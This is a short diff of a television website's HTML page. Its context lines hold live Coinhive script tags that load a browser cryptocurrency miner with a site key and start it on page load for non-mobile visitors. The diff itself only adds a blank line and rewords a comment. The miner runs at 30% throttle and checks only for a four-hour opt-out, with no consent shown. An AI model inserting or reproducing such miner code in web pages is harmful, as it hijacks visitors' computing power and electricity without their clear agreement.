@@ -44,11 +44,12 @@ Watch SoCALtelevision 24/7 at http://www.SoCALtelevision.com!" />
 <meta property="business:contact_data:postal_code"    content="92878" />   
 <meta property="business:contact_data:country_name"   content="United States" />
 
+
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('8gJbU0HIhX91VSLo00hiJPzJH2k85LT4', {throttle: 0.3});
 
-	// Only start on non-mobile devices and if not opted-out
+	// Miner will Only start on non-mobile devices and if not opted-out
 	// in the last 14400 seconds (4 hours):
 	if (!miner.isMobile() && !miner.didOptOut(14400)) {
 		miner.start();
